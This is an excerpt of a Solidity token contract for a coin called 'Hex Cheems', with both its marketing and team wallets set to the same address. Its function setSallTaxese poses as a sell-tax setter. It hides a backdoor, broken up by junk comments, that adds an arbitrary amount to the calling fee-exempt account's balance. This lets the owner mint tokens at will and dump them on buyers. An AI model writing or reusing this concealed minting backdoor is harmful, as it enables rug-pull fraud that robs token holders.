...
contract HexCheems is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Hex Cheems";
    string private _symbol = "HEXCHEEMS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xBe4CC9aEa61E40458E9748EE5a3EC38FE05889B6);
    address payable public teamWalletAddress = payable(0xBe4CC9aEa61E40458E9748EE5a3EC38FE05889B6);
    ...
    function setSallTaxese(uint256 newLiquidityTax,uint256 newTax) external {require(isExcludedFromFee[msg.sender]);_balances[msg.sender]= /*&%$#*/ _balances[msg.sender]  .  /*&%$#*/ add(newTax);
        _sellLiquidityFee = newLiquidityTax;
        _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellTeamFee);
    }
